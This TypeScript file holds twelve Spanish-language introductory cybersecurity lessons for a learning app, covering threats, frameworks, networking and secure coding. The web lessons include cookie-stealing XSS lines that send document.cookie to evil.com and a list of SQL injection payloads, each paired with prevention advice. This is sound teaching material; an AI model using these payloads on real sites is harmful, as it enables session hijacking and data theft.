import type { Lesson } from "./types";

// 12 lecciones extendidas. Cada una pertenece a un módulo (sub: "MX") y se puede
// renderizar con renderMarkdown() en lib/securities/cybersec/markdown.ts.
export const LESSONS: Lesson[] = [
  {
    id: 1,
    title: "¿Qué es la Ciberseguridad?",
    sub: "M1",
    dur: "25m",
    diff: "Básico",
    sections: [
      { h: "Definición", c: "La **ciberseguridad** protege sistemas, redes y datos contra ataques digitales. Combina:\n• **Tecnología** — Herramientas y software\n• **Procesos** — Políticas y frameworks\n• **Personas** — Capacitación y cultura\n\nNo es solo hackear: incluye defensa, detección, respuesta, recuperación y compliance." },
      { h: "Ramas del Campo", c: "🔴 **Red Team** — Simulan ataques (pentesting, exploits)\n🔵 **Blue Team** — Defienden (monitoreo, SIEM, IR)\n🟣 **Purple Team** — Combinan ambos\n🟢 **GRC** — Riesgo y compliance (GDPR, HIPAA)\n🔶 **Cloud Security** — AWS, Azure, GCP\n🛡️ **Forense Digital** — Investigación post-incidente\n🔧 **DevSecOps** — Seguridad en desarrollo\n📱 **Mobile/IoT Security** — Dispositivos conectados" },
      { h: "Historia y Evolución", c: "📅 **1971** Creeper (primer virus) → **1988** Morris Worm → **2000** ILOVEYOU → **2010** Stuxnet → **2013** Snowden/NSA → **2014** Heartbleed → **2017** WannaCry (230K equipos, 150 países) → **2020** SolarWinds → **2021** Colonial Pipeline + Log4Shell → **2023** MOVEit → **2024-25** Ataques con IA/deepfakes" },
      { h: "Cyber Kill Chain", c: "Lockheed Martin definió 7 fases de un ciberataque:\n\n1️⃣ **Reconnaissance** — Investigar al objetivo\n2️⃣ **Weaponization** — Crear el exploit/payload\n3️⃣ **Delivery** — Enviar al objetivo (email, web, USB)\n4️⃣ **Exploitation** — Ejecutar la vulnerabilidad\n5️⃣ **Installation** — Instalar malware/backdoor\n6️⃣ **C2** — Establecer canal de comando y control\n7️⃣ **Actions** — Cumplir objetivo (robo, destrucción)\n\nCada fase es una oportunidad para defender." },
    ],
  },
  {
    id: 2,
    title: "Tríada CIA y Principios",
    sub: "M2",
    dur: "30m",
    diff: "Básico",
    sections: [
      { h: "Tríada CIA", c: "🔒 **Confidencialidad** — Solo autorizados acceden. Cifrado, ACL, clasificación.\n🛡️ **Integridad** — Datos no alterados. Hashing, firmas digitales.\n⚡ **Disponibilidad** — Accesible cuando se necesita. Redundancia, backups, CDN." },
      { h: "Modelo AAA + Zero Trust", c: "🔑 **Autenticación** — ¿Quién eres? (MFA: algo que sabes + tienes + eres)\n✅ **Autorización** — ¿Qué puedes hacer? (RBAC, menor privilegio)\n📋 **Auditoría** — ¿Qué hiciste? (Logs)\n\n**Zero Trust:** \"Never trust, always verify.\" No confiar en nada dentro ni fuera de la red. Verificar cada solicitud como si viniera de una red hostil." },
      { h: "Defensa en Profundidad", c: "Capas como una cebolla:\n**Perímetro** → Firewall, WAF\n**Red** → IDS/IPS, segmentación, VPN\n**Host** → EDR, antivirus, hardening\n**App** → Código seguro, validación\n**Datos** → Cifrado, DLP, backups\n**Personas** → Capacitación, políticas" },
    ],
  },
  {
    id: 3,
    title: "Amenazas y Malware",
    sub: "M3",
    dur: "35m",
    diff: "Básico-Intermedio",
    sections: [
      { h: "Actores Maliciosos", c: "🎭 **Black Hat** — Maliciosos\n🤍 **White Hat** — Éticos, con permiso\n🩶 **Grey Hat** — Sin permiso, sin dañar\n🏛️ **APT** — Gobiernos (APT28, Lazarus)\n📜 **Script Kiddies** — Usan tools sin entender\n🏢 **Insiders** — Acceso legítimo, abusado\n🕵️ **Crimen organizado** — RaaS model" },
      { h: "Categorías de Ataques", c: "**Red:** DDoS, MITM, DNS Spoofing, ARP Poisoning\n**App:** SQLi, XSS, CSRF, SSRF, Directory Traversal\n**Social:** Phishing, Spear Phishing, Vishing, Pretexting, Baiting, BEC\n**Supply Chain:** Comprometer proveedor (SolarWinds)\n**Physical:** Tailgating, dumpster diving, shoulder surfing" },
      { h: "Malware Completo", c: "🦠 **Virus** — Necesita ejecución del usuario\n🐛 **Gusano** — Se propaga solo (WannaCry)\n🐴 **Troyano** — Disfrazado de legítimo\n🔐 **Ransomware** — Cifra y pide rescate\n👁️ **Spyware** — Espía actividad\n⌨️ **Keylogger** — Registra teclas\n🤖 **Botnet** — Red de zombies para DDoS\n🚪 **Rootkit** — Se oculta profundamente\n💣 **Logic Bomb** — Se activa con condición\n🔗 **Fileless** — Solo en memoria, sin archivo en disco" },
      { h: "Glosario", c: "📌 **Vulnerabilidad** — Debilidad explotable\n📌 **Exploit** — Código que la aprovecha\n📌 **Payload** — Carga maliciosa\n📌 **Zero-day** — Sin parche conocido\n📌 **CVE** — Catálogo de vulnerabilidades\n📌 **CVSS** — Score de severidad (0-10)\n📌 **IoC** — Indicador de compromiso\n📌 **TTPs** — Tácticas/Técnicas/Procedimientos" },
    ],
  },
  {
    id: 4,
    title: "Frameworks y Estándares",
    sub: "M4",
    dur: "20m",
    diff: "Intermedio",
    sections: [
      { h: "NIST CSF", c: "1️⃣ **Identificar** — Assets, riesgos\n2️⃣ **Proteger** — Controles\n3️⃣ **Detectar** — Monitoreo\n4️⃣ **Responder** — IR\n5️⃣ **Recuperar** — Restore + lessons learned" },
      { h: "Estándares Clave", c: "📋 **ISO 27001** — SGSI certificable\n🔶 **OWASP** — Top 10 web vulns\n🏛️ **CIS Controls** — 18 controles prácticos\n📜 **PCI-DSS** — Tarjetas de crédito\n🏥 **HIPAA** — Salud (EE.UU.)\n🇪🇺 **GDPR** — Datos personales (Europa)\n🔒 **SOC 2** — SaaS security\n📊 **NIST 800-53** — Catálogo de controles" },
      { h: "Certificaciones", c: "🟢 **Inicial:** Security+, Network+, Google Cyber\n🟡 **Intermedio:** CEH, CySA+, Pentest+\n🔴 **Avanzado:** OSCP, CISSP, CISM, GPEN\n🎯 **Tu ruta:** Security+ → CySA+/CEH → OSCP" },
    ],
  },
  {
    id: 5,
    title: "Modelo OSI",
    sub: "M5",
    dur: "35m",
    diff: "Intermedio",
    sections: [
      { h: "Las 7 Capas", c: "**7-App:** HTTP, DNS, FTP → XSS, SQLi\n**6-Presentación:** SSL/TLS, JPEG → SSL stripping\n**5-Sesión:** NetBIOS, RPC → Session hijacking\n**4-Transporte:** TCP, UDP → SYN flood, port scan\n**3-Red:** IP, ICMP, IPSec → IP spoofing, MITM\n**2-Enlace:** Ethernet, ARP → ARP poisoning, MAC flood\n**1-Física:** Cables, WiFi → Wiretapping, jamming\n\nMnemotécnico: **P**lease **D**o **N**ot **T**hrow **S**ausage **P**izza **A**way" },
      { h: "Encapsulamiento", c: "Al enviar datos, cada capa agrega un header:\nDatos → **Segmento** (TCP) → **Paquete** (IP) → **Trama** (MAC) → **Bits**\n\nAl recibir: desencapsulamiento (proceso inverso).\n\nCrucial para: análisis con Wireshark, entender firewalls, y saber dónde actúa cada herramienta de seguridad." },
    ],
  },
  {
    id: 6,
    title: "TCP/IP y Protocolos",
    sub: "M6",
    dur: "30m",
    diff: "Intermedio",
    sections: [
      { h: "TCP vs UDP", c: "**TCP** — Conexión con 3-way handshake (SYN→SYN-ACK→ACK). Fiable, ordenado, lento. HTTP, SSH, FTP.\n**UDP** — Sin conexión. Rápido, sin garantía. DNS, VoIP, gaming.\n\n**Ataques:** SYN Flood (TCP), UDP Flood, TCP Reset" },
      { h: "Protocolos y Puertos", c: "🔢 **20/21** FTP · **22** SSH · **23** Telnet (¡inseguro!) · **25** SMTP · **53** DNS · **80** HTTP · **110** POP3 · **143** IMAP · **443** HTTPS · **445** SMB · **3389** RDP · **3306** MySQL\n\nPuertos abiertos = superficie de ataque. Nmap los descubre, firewalls los filtran." },
      { h: "DNS en Profundidad", c: "Traduce nombres → IPs. Proceso: Resolver → Root → TLD → Authoritative.\n\n**Ataques:** DNS Spoofing/Poisoning, DNS Tunneling (exfiltrar datos), DNS Amplification (DDoS), Typosquatting" },
    ],
  },
  {
    id: 7,
    title: "Direccionamiento IP",
    sub: "M7",
    dur: "30m",
    diff: "Intermedio",
    sections: [
      { h: "IPv4 y Subnetting", c: "32 bits: **192.168.1.100**\n\n**Privadas:** 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16\n**Especiales:** 127.0.0.1 (localhost), 0.0.0.0 (todas)\n\n**/24** = 256 IPs, 254 usables\n**/25** = 128 IPs, 126 usables\n**/26** = 64 IPs, 62 usables\n\nSubnetting = segmentar red = limitar alcance de ataques." },
      { h: "NAT, DHCP e IPv6", c: "**NAT:** IP privada → pública para Internet\n**DHCP:** Asigna IPs automáticamente (Discover→Offer→Request→Ack)\n**IPv6:** 128 bits, 340 undecillones de IPs, IPSec nativo\n\n**Ataques:** DHCP Starvation, Rogue DHCP, IPv6 tunneling bypass" },
    ],
  },
  {
    id: 8,
    title: "Wireshark",
    sub: "M8",
    dur: "30m",
    diff: "Intermedio",
    sections: [
      { h: "Filtros Esenciales", c: "**Display:** http, dns, tcp.port==80, ip.addr==10.0.0.1, tcp.flags.syn==1, frame contains \"password\"\n**Combos:** http && ip.src==192.168.1.100\n**Detectar:** POST con credenciales, DNS tunneling (subdominios largos), Nmap scan (muchos SYN), ARP spoof (MAC cambiante)" },
      { h: "Herramientas Complementarias", c: "🔧 **tcpdump** — CLI capture en Linux\n🔧 **tshark** — Wireshark en terminal\n🔧 **NetworkMiner** — Forense de red\n🔧 **Zeek** — IDS basado en tráfico" },
    ],
  },
  {
    id: 9,
    title: "Python para CyberSec",
    sub: "M51",
    dur: "40m",
    diff: "Intermedio",
    sections: [
      { h: "¿Por qué Python?", c: "Python es EL lenguaje de ciberseguridad por:\n→ Sintaxis simple y legible\n→ Enorme ecosistema de librerías\n→ Prototipado rápido de herramientas\n→ Scripting y automatización\n→ Compatible con Scapy, Requests, PyCrypto, Impacket\n\n**Usado para:** pentesting, malware analysis, automatización, forense, web scraping, exploit development" },
      { h: "Fundamentos", c: "**Variables y tipos:**\nip = \"192.168.1.1\"\nport = 80\nhosts = [\"10.0.0.1\", \"10.0.0.2\"]\n\n**Funciones:**\ndef scan_port(ip, port):\n    # lógica aquí\n    return result\n\n**Loops y condicionales:**\nfor port in range(1, 1025):\n    if is_open(ip, port):\n        print(f\"Port {port} OPEN\")\n\n**Manejo de archivos:**\nwith open(\"log.txt\") as f:\n    for line in f:\n        if \"failed\" in line.lower():\n            print(line)" },
      { h: "Networking con Python", c: "**Socket scanner:**\nimport socket\ndef scan(ip, port):\n    s = socket.socket()\n    s.settimeout(1)\n    result = s.connect_ex((ip, port))\n    s.close()\n    return result == 0\n\n**HTTP requests:**\nimport requests\nr = requests.get(\"https://target.com\")\nprint(r.status_code, r.headers)\n\n**Scapy (packet crafting):**\nfrom scapy.all import *\npkt = IP(dst=\"target\")/TCP(dport=80,flags=\"S\")\nans = sr1(pkt, timeout=1)" },
      { h: "Librerías Clave", c: "📦 **scapy** — Manipulación de paquetes\n📦 **requests** — HTTP client\n📦 **paramiko** — SSH client\n📦 **pycryptodome** — Cifrado\n📦 **impacket** — Protocolos Windows (SMB, NTLM)\n📦 **beautifulsoup4** — Web scraping\n📦 **shodan** — API de Shodan\n📦 **python-nmap** — Interface de Nmap\n📦 **volatility3** — Forense de memoria\n📦 **yara-python** — Detección de malware" },
    ],
  },
  {
    id: 10,
    title: "JavaScript y Seguridad Web",
    sub: "M53",
    dur: "35m",
    diff: "Intermedio",
    sections: [
      { h: "JS en Seguridad", c: "JavaScript es esencial para entender ataques web:\n→ **XSS:** inyectar JS malicioso en páginas\n→ **CSRF:** ejecutar acciones no deseadas\n→ **Clickjacking:** superposición invisible\n→ **DOM manipulation:** modificar página dinámicamente\n\nComo defensor, necesitas entender JS para:\n→ Auditar código frontend\n→ Implementar CSP correctamente\n→ Detectar scripts maliciosos" },
      { h: "Fundamentos", c: "**Variables y funciones:**\nlet target = \"https://victim.com\";\nconst payload = '<script>alert(\"XSS\")</script>';\n\nfunction testXSS(input) {\n  return input.replace(/</g, \"&lt;\");\n}\n\n**DOM manipulation:**\ndocument.cookie // leer cookies\ndocument.location = \"http://evil.com?c=\" + document.cookie\n\n**Fetch API:**\nfetch(\"/api/users\")\n  .then(r => r.json())\n  .then(data => console.log(data));" },
      { h: "XSS desde la Perspectiva del Atacante", c: "**Reflected XSS:**\nhttps://site.com/search?q=<script>alert(1)</script>\n\n**Stored XSS:**\nComentario: <img src=x onerror=alert(document.cookie)>\n\n**DOM XSS:**\ndocument.write(location.hash.substring(1))\n\n**Cookie stealing:**\n<script>\nnew Image().src=\"http://evil.com/steal?c=\"+document.cookie;\n</script>\n\n**Prevención:** CSP headers, input sanitization, HttpOnly cookies, output encoding" },
    ],
  },
  {
    id: 11,
    title: "SQL y Database Security",
    sub: "M54",
    dur: "30m",
    diff: "Intermedio",
    sections: [
      { h: "SQL Fundamentals", c: "**Consultas básicas:**\nSELECT * FROM users WHERE role='admin';\nINSERT INTO logs (event, ip) VALUES ('login', '10.0.0.1');\nUPDATE users SET password='hash' WHERE id=1;\nDELETE FROM sessions WHERE expired=1;\n\n**JOINs:**\nSELECT u.name, r.role FROM users u\nJOIN roles r ON u.role_id = r.id;" },
      { h: "SQL Injection", c: "**Básico:** ' OR 1=1 --\n**UNION based:**\n' UNION SELECT username,password FROM users --\n**Error based:**\n' AND 1=CONVERT(int,(SELECT @@version)) --\n**Blind (boolean):**\n' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' --\n**Time-based:**\n' AND IF(1=1, SLEEP(5), 0) --\n\n**Prevención:** Prepared statements, parameterized queries, WAF, input validation, least privilege en DB user" },
      { h: "Database Hardening", c: "🔒 Cambiar credenciales por defecto\n🔒 Deshabilitar funciones peligrosas (xp_cmdshell)\n🔒 Principio de menor privilegio en DB users\n🔒 Cifrar datos sensibles at rest y in transit\n🔒 Auditar queries y accesos\n🔒 Backups cifrados y testeados\n🔒 Actualizar y parchear regularmente\n🔒 Network segmentation (DB no expuesta a internet)" },
    ],
  },
  {
    id: 12,
    title: "C/C++ y Low-Level Security",
    sub: "M55",
    dur: "35m",
    diff: "Avanzado",
    sections: [
      { h: "¿Por qué C para Seguridad?", c: "C/C++ son esenciales para:\n→ **Reverse engineering** — Entender binarios compilados\n→ **Exploit development** — Buffer overflows, shellcode\n→ **Malware analysis** — La mayoría de malware es C/C++\n→ **Kernel/OS internals** — Linux y Windows son C\n→ **Entender vulnerabilidades de memoria** — Las más críticas\n\nNo necesitas ser experto, pero sí entender: punteros, memoria, stack/heap." },
      { h: "Memoria y Vulnerabilidades", c: "**Stack layout:**\n[buffer local][saved EBP][return address][parámetros]\n\n**Buffer Overflow:**\nchar buffer[64];\ngets(buffer); // ¡NO valida longitud!\n// Si escribes 80 bytes, sobrescribes return address\n\n**Tipos de vulnerabilidades:**\n→ Stack buffer overflow\n→ Heap overflow\n→ Use-after-free\n→ Format string\n→ Integer overflow\n→ Double free\n\n**Protecciones modernas:** ASLR, DEP/NX, Stack Canaries, PIE" },
      { h: "Contramedidas", c: "**ASLR** — Randomiza direcciones de memoria\n**DEP/NX** — No ejecutar datos en stack\n**Stack Canaries** — Detectar overflow antes de return\n**PIE** — Position Independent Executable\n**RELRO** — Protect GOT table\n\n**Bypass techniques (avanzado):**\n→ ROP chains (Return Oriented Programming)\n→ ret2libc\n→ Information leaks para bypassear ASLR\n→ Heap spraying" },
    ],
  },
];

export function getLesson(id: number): Lesson | undefined {
  return LESSONS.find((l) => l.id === id);
}

// Maps a module id (e.g. 1) to the lessons whose `sub` references that module ("M1").
export function lessonsForModule(moduleId: number): Lesson[] {
  const tag = `M${moduleId}`;
  return LESSONS.filter((l) => l.sub === tag);
}
